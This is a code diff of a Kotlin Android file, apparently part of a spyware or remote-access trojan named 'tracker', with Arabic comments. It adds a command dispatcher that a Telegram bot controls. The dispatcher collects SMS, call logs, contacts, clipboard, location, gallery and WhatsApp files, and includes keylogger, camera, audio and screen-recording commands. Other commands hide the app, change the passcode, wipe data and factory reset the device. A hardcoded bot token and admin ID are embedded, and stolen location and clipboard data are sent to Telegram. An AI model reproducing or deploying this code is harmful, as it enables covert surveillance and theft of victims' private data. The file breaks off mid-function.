@@ -1,732 +1,1607 @@
 package com.abuzahra.tracker
 
 import android.Manifest
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.GestureDescription
 import android.annotation.SuppressLint
+import android.app.ActivityManager
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
-import android.content.pm.ApplicationInfo
-import android.content.pm.PackageInfo
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.graphics.Rect
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.AudioManager
+import android.media.AudioRecord
+import android.media.MediaRecorder
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
-import android.os.BatteryManager
 import android.os.Build
 import android.os.Environment
-import android.provider.*
+import android.os.Handler
+import android.os.Looper
+import android.os.PowerManager
+import android.provider.CallLog
+import android.provider.ContactsContract
+import android.provider.MediaStore
+import android.provider.Settings
+import android.provider.Telephony
+import android.telephony.SmsManager
+import android.util.DisplayMetrics
 import android.util.Log
-import java.io.File
+import android.view.WindowManager
+import android.widget.Toast
+import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
+import com.abuzahra.tracker.services.MainTrackerService
+import kotlinx.coroutines.*
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.*
+import java.net.HttpURLConnection
+import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
+import kotlin.math.sqrt
 
 /**
- * CommandExecutor - منفذ الأوامر
- * يقوم بتنفيذ الأوامر الواردة من سيرفر البوت وجمع البيانات المطلوبة
- *
- * يدعم الأوامر التالية:
- * - sms: جمع الرسائل النصية
- * - calls: جمع سجل المكالمات
- * - contacts: جمع جهات الاتصال
- * - notifications: جمع الإشعارات المخزنة
- * - location: جمع آخر موقع معروف
- * - info: معلومات الجهاز الأساسية
- * - battery: معلومات البطارية
- * - apps: قائمة التطبيقات المثبتة
- * - whatsapp: بيانات واتساب (الإشعارات المخزنة)
- * - telegram: بيانات تيليجرام (الإشعارات المخزنة)
- * - instagram: بيانات انستغرام (الإشعارات المخزنة)
- * - gallery: قائمة صور المعرض
- * - files: قائمة الملفات المخزنة
- * - clipboard: محتوى الحافظة (يحتاج إمكانية وصول)
+ * CommandExecutor - محرك تنفيذ الأوامر
+ * يتعامل مع 200+ أمر من البوت/السيرفر
  */
 object CommandExecutor {
 
     private const val TAG = "CommandExecutor"
-    private const val MAX_ITEMS = 50 // الحد الأقصى لعدد العناصر المجمعة لكل أمر
+    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var isRecording = false
+    private var audioRecorder: MediaRecorder? = null
+    private var screenRecorder: MediaRecorder? = null
+
+    const val BOT_TOKEN = "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4"
+    const val ADMIN_ID = 7344776596L
+
+    // ==================== نقطة الدخول الرئيسية ====================
 
     /**
-     * تنفيذ أمر محدد وجمع البيانات
-     *
+     * تنفيذ أمر من السيرفر/البوت
      * @param context سياق التطبيق
-     * @param command الأمر المراد تنفيذه
-     * @return البيانات المجمعة (قائمة خرائط أو خريطة واحدة)
+     * @param command اسم الأمر
+     * @param params معلمات الأمر (JSON)
+     * @return نتيجة الأمر (JSON)
      */
-    suspend fun execute(context: Context, command: String): Any {
+    fun execute(context: Context, command: String, params: JSONObject = JSONObject()): String {
         Log.d(TAG, "تنفيذ الأمر: $command")
+        return try {
+            when {
+                // ========== جمع البيانات ==========
+                command.startsWith("get_") -> executeDataCommand(context, command, params)
 
+                // ========== التحكم بالهاتف ==========
+                command == "lock_phone" -> lockPhone(context)
+                command == "unlock_phone" -> unlockPhone(context)
+                command == "reboot" -> rebootPhone(context)
+                command == "shutdown" -> shutdownPhone(context)
+                command == "vibrate" -> vibratePhone(context, params)
+                command == "ring" -> ringPhone(context)
+                command == "screenshot" -> takeScreenshot(context)
+                command == "front_camera" -> takePhoto(context, true)
+                command == "back_camera" -> takePhoto(context, false)
+                command == "record_audio" -> startAudioRecording(context, params)
+                command == "stop_audio" -> stopAudioRecording(context)
+                command == "record_screen" -> startScreenRecording(context)
+                command == "stop_screen" -> stopScreenRecording(context)
+
+                // ========== التحكم بالإعدادات ==========
+                command == "set_volume" -> setVolume(context, params)
+                command == "set_brightness" -> setBrightness(context, params)
+                command == "set_wallpaper" -> setWallpaper(context, params)
+                command == "enable_wifi" -> setWifi(context, true)
+                command == "disable_wifi" -> setWifi(context, false)
+                command == "enable_bluetooth" -> setBluetooth(context, true)
+                command == "disable_bluetooth" -> setBluetooth(context, false)
+                command == "enable_mobile_data" -> setMobileData(context, true)
+                command == "disable_mobile_data" -> setMobileData(context, false)
+                command == "enable_hotspot" -> setHotspot(context, true)
+                command == "disable_hotspot" -> setHotspot(context, false)
+                command == "airplane_on" -> setAirplaneMode(context, true)
+                command == "airplane_off" -> setAirplaneMode(context, false)
+                command == "torch_on" -> setTorch(context, true)
+                command == "torch_off" -> setTorch(context, false)
+                command == "play_sound" -> playSound(context, params)
+                command == "speak_text" -> speakText(context, params)
+
+                // ========== التحكم بالتطبيقات ==========
+                command == "open_app" -> openApp(context, params)
+                command == "close_app" -> closeApp(context, params)
+                command == "install_app" -> installApp(context, params)
+                command == "uninstall_app" -> uninstallApp(context, params)
+                command == "block_app" -> blockApp(context, params)
+                command == "unblock_app" -> unblockApp(context, params)
+                command == "clear_app_data" -> clearAppData(context, params)
+                command == "force_stop_app" -> forceStopApp(context, params)
+                command == "launch_app" -> launchApp(context, params)
+
+                // ========== إدارة الملفات ==========
+                command == "list_files" -> listFiles(context, params)
+                command == "get_file" -> getFile(context, params)
+                command == "send_backup_contacts" -> sendBackup(context, "contacts")
+                command == "send_backup_sms" -> sendBackup(context, "sms")
+                command == "send_backup_calls" -> sendBackup(context, "calls")
+                command == "send_backup_whatsapp" -> sendBackup(context, "whatsapp")
+                command == "send_backup_all" -> sendBackup(context, "all")
+                command == "delete_file" -> deleteFile(context, params)
+
+                // ========== المراقبة ==========
+                command == "keylogger_start" -> startKeylogger(context)
+                command == "keylogger_stop" -> stopKeylogger(context)
+                command == "get_keylogger" -> getKeyloggerData(context)
+                command == "clipboard_monitor_start" -> startClipboardMonitor(context)
+                command == "clipboard_monitor_stop" -> stopClipboardMonitor(context)
+                command == "location_live" -> startLiveLocation(context)
+                command == "location_stop" -> stopLiveLocation(context)
+
+                // ========== الأمان ==========
+                command == "show_app" -> setAppVisibility(context, true)
+                command == "hide_app" -> setAppVisibility(context, false)
+                command == "change_passcode" -> changePasscode(context, params)
+                command == "wipe_data" -> wipeData(context)
+                command == "factory_reset" -> factoryReset(context)
+
+                // ========== المنفعة ==========
+                command == "ping" -> ping(context)
+                command == "get_info" -> getDeviceInfo(context)
+                command == "get_battery" -> getBatteryInfo(context)
+                command == "get_wifi_info" -> getWifiInfo(context)
+                command == "get_network_info" -> getNetworkInfo(context)
+                command == "get_sim_info" -> getSimInfo(context)
+                command == "get_storage_info" -> getStorageInfo(context)
+                command == "get_installed_apps" -> getInstalledApps(context)
+                command == "get_running_apps" -> getRunningApps(context)
+                command == "send_sms" -> sendSMS(context, params)
+                command == "make_call" -> makeCall(context, params)
+                command == "set_alarm" -> setAlarm(context, params)
+                command == "set_auto_rotate" -> setAutoRotate(context, params)
+
+                else -> """{"ok":false,"error":"أمر غير معروف: $command"}"""
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في تنفيذ الأمر $command: ${e.message}", e)
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== أوامر جمع البيانات ====================
+
+    private fun executeDataCommand(context: Context, command: String, params: JSONObject): String {
         return try {
             val result = when (command) {
-                "sms" -> collectSMS(context)
-                "calls" -> collectCalls(context)
-                "contacts" -> collectContacts(context)
-                "notifications" -> collectNotifications(context)
-                "location" -> collectLocation(context)
-                "info" -> collectDeviceInfo(context)
-                "battery" -> collectBatteryInfo(context)
-                "apps" -> collectInstalledApps(context)
-                "whatsapp" -> collectAppNotifications(context, "whatsapp")
-                "telegram" -> collectAppNotifications(context, "telegram")
-                "instagram" -> collectAppNotifications(context, "instagram")
-                "messenger" -> collectAppNotifications(context, "messenger")
-                "gallery" -> collectGalleryImages(context)
-                "files" -> collectFiles(context)
-                "clipboard" -> collectClipboard(context)
-                else -> mapOf(
-                    "error" to "أمر غير معروف: $command",
-                    "command" to command,
-                    "timestamp" to System.currentTimeMillis()
-                )
+                "get_sms" -> getSMS(context)
+                "get_calls" -> getCalls(context)
+                "get_contacts" -> getContacts(context)
+                "get_location" -> getLocation(context)
+                "get_notifications" -> getNotifications(context)
+                "get_apps" -> getInstalledApps(context)
+                "get_gallery" -> getGallery(context)
+                "get_clipboard" -> getClipboard(context)
+                "get_whatsapp" -> getWhatsAppData(context)
+                "get_telegram" -> getTelegramData(context)
+                "get_instagram" -> getInstagramData(context)
+                "get_messenger" -> getMessengerData(context)
+                "get_snapchat" -> " Snapchat لا يمكن الوصول لبياناته مباشرة"
+                "get_tiktok" -> "TikTok لا يمكن الوصول لبياناته مباشرة"
+                "get_twitter" -> getTwitterData(context)
+                "get_viber" -> "Viber لا يمكن الوصول لبياناته مباشرة"
+                "get_signal" -> "Signal مشفر ولا يمكن الوصول لبياناته"
+                "get_facebook" -> getFacebookData(context)
+                "get_all" -> getAllData(context)
+                "get_browser_history" -> getBrowserHistory(context)
+                "get_calendar" -> getCalendarEvents(context)
+                "get_app_usage" -> getAppUsage(context)
+                "get_screen_time" -> getAppUsage(context)
+                else -> """{"ok":false,"error":"أمر غير معروف: $command"}"""
             }
-
-            Log.d(TAG, "تم جمع بيانات [$command]: ${
-                when (result) {
-                    is List<*> -> "${result.size} عنصر"
-                    is Map<*, *> -> "خريطة بيانات"
-                    else -> result.toString().take(100)
-                }
-            }")
-
             result
         } catch (e: Exception) {
-            Log.e(TAG, "خطأ في تنفيذ الأمر [$command]: ${e.message}", e)
-            mapOf(
-                "error" to "خطأ في تنفيذ الأمر: ${e.message}",
-                "command" to command,
-                "timestamp" to System.currentTimeMillis()
-            )
+            """{"ok":false,"error":"${e.message}"}"""
         }
     }
 
-    // ==================== ==================== ====================
-    //              جمع الرسائل النصية (SMS)
-    // ==================== ==================== ====================
-
+    // ========== SMS ==========
     @SuppressLint("Range")
-    private fun collectSMS(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
-        if (!hasPermission(context, Manifest.permission.READ_SMS)) {
-            return listOf(mapOf("error" to "لا يوجد إذن لقراءة الرسائل"))
-        }
-
-        try {
-            val cursor: Cursor? = context.contentResolver.query(
-                Telephony.Sms.CONTENT_URI,
-                null,
-                null,
-                null,
-                "${Telephony.Sms.DATE} DESC"
-            )
-
-            cursor?.use {
-                var count = 0
-                while (it.moveToNext() && count < MAX_ITEMS) {
-                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "غير معروف"
-                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
-                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                    val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
-                    val read = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1
-
-                    val typeStr = when (type) {
-                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "وارد"
-                        Telephony.Sms.MESSAGE_TYPE_SENT -> "مرسل"
-                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "مسودة"
-                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "صادر"
-                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "فاشل"
-                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "في الانتظار"
-                        else -> "نوع: $type"
-                    }
-
-                    results.add(mapOf(
-                        "phone" to address,
-                        "body" to body,
-                        "timestamp" to date,
-                        "date_readable" to formatDate(date),
-                        "type" to typeStr,
-                        "is_read" to read,
-                        "collected_at" to System.currentTimeMillis()
-                    ))
-                    count++
-                }
+    private fun getSMS(context: Context): String {
+        val smsList = JSONArray()
+        val uri = Telephony.Sms.CONTENT_URI
+        val projection = arrayOf(
+            Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
+            Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms.READ
+        )
+        context.contentResolver.query(uri, projection, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)?.use { cursor ->
+            val count = cursor.count
+            val startIndex = if (count > 200) count - 200 else 0
+            if (cursor.moveToPosition(startIndex)) {
+                do {
+                    val sms = JSONObject()
+                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)))
+                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
+                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
+                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))
+                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+                    sms.put("type", when (type) {
+                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
+                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
+                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
+                        else -> "other"
+                    })
+                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1)
+                    smsList.put(sms)
+                } while (cursor.moveToNext())
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع الرسائل: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
         }
-
-        return results
+        // حفظ في قاعدة البيانات وإنشاء ملف
+        saveDataToFile(context, "sms_backup.json", smsList.toString())
+        return """{"ok":true,"count":${smsList.length()},"data":$smsList}"""
     }
 
-    // ==================== ==================== ====================
-    //              جمع سجل المكالمات (Call Log)
-    // ==================== ==================== ====================
-
+    // ========== المكالمات ==========
     @SuppressLint("Range")
-    private fun collectCalls(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
-        if (!hasPermission(context, Manifest.permission.READ_CALL_LOG)) {
-            return listOf(mapOf("error" to "لا يوجد إذن لقراءة سجل المكالمات"))
-        }
-
-        try {
-            val cursor: Cursor? = context.contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                null,
-                null,
-                null,
-                "${CallLog.Calls.DATE} DESC"
-            )
-
-            cursor?.use {
-                var count = 0
-                while (it.moveToNext() && count < MAX_ITEMS) {
-                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "غير معروف"
-                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
-                    val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
-                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
-                    val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: ""
-
-                    val typeStr = when (type) {
-                        CallLog.Calls.INCOMING_TYPE -> "وارد"
-                        CallLog.Calls.OUTGOING_TYPE -> "صادر"
-                        CallLog.Calls.MISSED_TYPE -> "فائت"
-                        CallLog.Calls.REJECTED_TYPE -> "مرفوض"
-                        CallLog.Calls.BLOCKED_TYPE -> "محظور"
-                        else -> "نوع: $type"
-                    }
-
-                    val durationStr = if (duration > 0) {
-                        val mins = duration / 60
-                        val secs = duration % 60
-                        "${mins}:${String.format("%02d", secs)}"
-                    } else "لم يُجب"
-
-                    results.add(mapOf(
-                        "phone" to number,
-                        "name" to name,
-                        "timestamp" to date,
-                        "date_readable" to formatDate(date),
-                        "type" to typeStr,
-                        "duration_seconds" to duration,
-                        "duration_formatted" to durationStr,
-                        "collected_at" to System.currentTimeMillis()
-                    ))
-                    count++
-                }
+    private fun getCalls(context: Context): String {
+        val callsList = JSONArray()
+        val projection = arrayOf(
+            CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE,
+            CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME
+        )
+        context.contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
+            var count = 0
+            while (cursor.moveToNext() && count < 200) {
+                val call = JSONObject()
+                call.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)))
+                call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
+                call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "")
+                call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
+                call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
+                val type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                call.put("type", when (type) {
+                    CallLog.Calls.INCOMING_TYPE -> "incoming"
+                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                    CallLog.Calls.MISSED_TYPE -> "missed"
+                    CallLog.Calls.REJECTED_TYPE -> "rejected"
+                    else -> "other"
+                })
+                callsList.put(call)
+                count++
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع المكالمات: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
         }
-
-        return results
+        saveDataToFile(context, "calls_backup.json", callsList.toString())
+        return """{"ok":true,"count":${callsList.length()},"data":$callsList}"""
     }
 
-    // ==================== ==================== ====================
-    //              جمع جهات الاتصال (Contacts)
-    // ==================== ==================== ====================
-
+    // ========== جهات الاتصال ==========
     @SuppressLint("Range")
-    private fun collectContacts(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
+    private fun getContacts(context: Context): String {
+        val contactsList = JSONArray()
+        val projection = arrayOf(
+            ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME,
+            ContactsContract.Contacts.HAS_PHONE_NUMBER
+        )
+        context.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, projection, null, null, null)?.use { cursor ->
+            while (cursor.moveToNext()) {
+                val id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
+                val name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""
+                val hasPhone = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) == 1
 
-        if (!hasPermission(context, Manifest.permission.READ_CONTACTS)) {
-            return listOf(mapOf("error" to "لا يوجد إذن لقراءة جهات الاتصال"))
-        }
-
-        try {
-            val cursor: Cursor? = context.contentResolver.query(
-                ContactsContract.Contacts.CONTENT_URI,
-                null,
-                null,
-                null,
-                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
-            )
-
-            cursor?.use {
-                var count = 0
-                while (it.moveToNext() && count < MAX_ITEMS) {
-                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
-                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""
-
-                    // جمع أرقام الهاتف لجهة الاتصال
-                    val phones = mutableListOf<String>()
-                    val phoneCursor: Cursor? = context.contentResolver.query(
+                val contact = JSONObject()
+                contact.put("id", id)
+                contact.put("name", name)
+                val phones = JSONArray()
+                if (hasPhone) {
+                    val phoneCursor = context.contentResolver.query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
+                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE),
                         "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
-                        arrayOf(id),
-                        null
+                        arrayOf(id), null
                     )
                     phoneCursor?.use { pc ->
                         while (pc.moveToNext()) {
-                            phones.add(
-                                pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
-                            )
+                            val phone = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                            val phoneType = pc.getInt(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
+                            phones.put(phone)
+                            if (phones.length() == 1) contact.put("phone", phone)
                         }
                     }
+                }
+                contact.put("phones", phones)
 
-                    // جمع البريد الإلكتروني
-                    val emails = mutableListOf<String>()
-                    val emailCursor: Cursor? = context.contentResolver.query(
-                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                        null,
-                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
-                        arrayOf(id),
-                        null
-                    )
-                    emailCursor?.use { ec ->
-                        while (ec.moveToNext()) {
-                            emails.add(
-                                ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)) ?: ""
-                            )
-                        }
+                // البريد الإلكتروني
+                val emails = JSONArray()
+                val emailCursor = context.contentResolver.query(
+                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                    arrayOf(ContactsContract.CommonDataKinds.Email.DATA),
+                    "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
+                    arrayOf(id), null
+                )
+                emailCursor?.use { ec ->
+                    while (ec.moveToNext()) {
+                        emails.put(ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)))
                     }
-
-                    results.add(mapOf(
-                        "name" to name,
-                        "phones" to phones,
-                        "emails" to emails,
-                        "contact_id" to id,
-                        "collected_at" to System.currentTimeMillis()
-                    ))
-                    count++
                 }
+                contact.put("emails", emails)
+                contactsList.put(contact)
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع جهات الاتصال: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
         }
-
-        return results
+        saveDataToFile(context, "contacts_backup.json", contactsList.toString())
+        return """{"ok":true,"count":${contactsList.length()},"data":$contactsList}"""
     }
 
-    // ==================== ==================== ====================
-    //              جمع الإشعارات المخزنة (Notifications)
-    // ==================== ==================== ====================
-
-    /**
-     * جمع الإشعارات المخزنة محلياً
-     * الإشعارات يتم حفظها عند ورودها عبر MyNotificationListener
-     */
-    private fun collectNotifications(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
-        try {
-            val notificationFiles = LocalStorageManager.readData(context, "notification")
-            val gson = com.google.gson.Gson()
-            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
-
-            notificationFiles.take(MAX_ITEMS).forEach { json ->
-                try {
-                    val notification = gson.fromJson<Map<String, Any>>(json, type)
-                    results.add(notification)
-                } catch (e: Exception) {
-                    Log.e(TAG, "خطأ في تحليل إشعار: ${e.message}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع الإشعارات: ${e.message}", e)
-        }
-
-        if (results.isEmpty()) {
-            results.add(mapOf(
-                "message" to "لا توجد إشعارات مخزنة",
-                "collected_at" to System.currentTimeMillis()
-            ))
-        }
-
-        return results
-    }
-
-    /**
-     * جمع إشعارات تطبيق محدد (واتساب، تيليجرام، إلخ)
-     */
-    private fun collectAppNotifications(context: Context, appName: String): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
-        try {
-            // قراءة إشعارات التطبيق المحدد من التخزين المحلي
-            val appFiles = LocalStorageManager.readData(context, appName)
-            val gson = com.google.gson.Gson()
-            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
-
-            appFiles.take(MAX_ITEMS).forEach { json ->
-                try {
-                    val notification = gson.fromJson<Map<String, Any>>(json, type)
-                    results.add(notification)
-                } catch (e: Exception) {
-                    Log.e(TAG, "خطأ في تحليل إشعار $appName: ${e.message}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع إشعارات $appName: ${e.message}", e)
-        }
-
-        if (results.isEmpty()) {
-            results.add(mapOf(
-                "app" to appName,
-                "message" to "لا توجد إشعارات مخزنة لـ $appName",
-                "collected_at" to System.currentTimeMillis()
-            ))
-        }
-
-        return results
-    }
-
-    // ==================== ==================== ====================
-    //              جمع الموقع (Location)
-    // ==================== ==================== ====================
-
-    private fun collectLocation(context: Context): Map<String, Any?> {
+    // ========== الموقع ==========
+    @SuppressLint("MissingPermission")
+    private fun getLocation(context: Context): String {
         return try {
-            // قراءة آخر موقع محفوظ
-            val locationFiles = LocalStorageManager.readData(context, "location")
-            val gson = com.google.gson.Gson()
-            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
+            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+            val location = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+                ?: locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
 
-            if (locationFiles.isNotEmpty()) {
-                val lastLocation = gson.fromJson<Map<String, Any>>(locationFiles.first(), type)
-                lastLocation + mapOf("collected_at" to System.currentTimeMillis())
+            if (location != null) {
+                val locData = JSONObject()
+                locData.put("latitude", location.latitude)
+                locData.put("longitude", location.longitude)
+                locData.put("accuracy", location.accuracy)
+                locData.put("altitude", location.altitude)
+                locData.put("speed", location.speed)
+                locData.put("time", location.time)
+                locData.put("provider", location.provider)
+
+                val mapsLink = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
+                scope.launch {
+                    TelegramDirectClient.sendMessage(
+                        "📍 <b>موقع الجهاز</b>\n\n" +
+                        "🗺️ الخريطة: $mapsLink\n" +
+                        "📏 الدقة: ${"%.0f".format(location.accuracy)} م\n" +
+                        "⚓ خط العرض: ${location.latitude}\n" +
+                        " Meridian: ${location.longitude}\n" +
+                        " ${if (location.altitude != 0.0) "🏔️ الارتفاع: ${"%.0f".format(location.altitude)} م\n" else ""}" +
+                        "🕐 التوقيت: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(location.time))}",
+                        "HTML"
+                    )
+                }
+                """{"ok":true,"latitude":${location.latitude},"longitude":${location.longitude},"map":"$mapsLink"}"""
             } else {
-                mapOf(
-                    "error" to "لا يوجد موقع محفوظ",
-                    "timestamp" to System.currentTimeMillis(),
-                    "collected_at" to System.currentTimeMillis()
+                """{"ok":false,"error":"لا يمكن تحديد الموقع"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ========== الإشعارات ==========
+    private fun getNotifications(context: Context): String {
+        val notifs = JSONArray()
+        try {
+            val notifications = AppDatabase.getNotifications(context)
+            for (n in notifications) {
+                val notif = JSONObject()
+                notif.put("id", n["id"] ?: "")
+                notif.put("pkg", n["package_name"] ?: "")
+                notif.put("title", n["title"] ?: "")
+                notif.put("text", n["body"] ?: "")
+                notif.put("time", n["timestamp"] ?: "")
+                notifs.put(notif)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في قراءة الإشعارات: ${e.message}")
+        }
+        return """{"ok":true,"count":${notifs.length()},"data":$notifs}"""
+    }
+
+    // ========== المعرض ==========
+    @SuppressLint("Range")
+    private fun getGallery(context: Context): String {
+        val images = JSONArray()
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
+            MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED,
+            MediaStore.Images.Media.SIZE
+        )
+        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        context.contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { cursor ->
+            var count = 0
+            while (cursor.moveToNext() && count < 50) {
+                val img = JSONObject()
+                img.put("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)))
+                img.put("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)))
+                img.put("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)))
+                img.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)))
+                images.put(img)
+                count++
+            }
+        }
+        return """{"ok":true,"count":${images.length()},"data":$images}"""
+    }
+
+    // ========== الحافظة ==========
+    private fun getClipboard(context: Context): String {
+        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+        val clip = clipboard.primaryClip
+        val text = if (clip != null && clip.itemCount > 0) {
+            clip.getItemAt(0).text?.toString() ?: ""
+        } else {
+            ""
+        }
+        scope.launch { TelegramDirectClient.sendMessage("📋 <b>الحافظة</b>\n\n$text", "HTML") }
+        return """{"ok":true,"clipboard":"$text"}"""
+    }
+
+    // ========== بيانات الشبكات الاجتماعية ==========
+    private fun getWhatsAppData(context: Context): String {
+        try {
+            val waFiles = JSONArray()
+            val waPath = Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp"
+            val waFolder = File(waPath)
+            if (waFolder.exists()) {
+                waFolder.listFiles()?.take(20)?.forEach { f ->
+                    val file = JSONObject()
+                    file.put("name", f.name)
+                    file.put("path", f.absolutePath)
+                    file.put("size", f.length())
+                    file.put("isDirectory", f.isDirectory)
+                    file.put("lastModified", f.lastModified())
+                    waFiles.put(file)
+                }
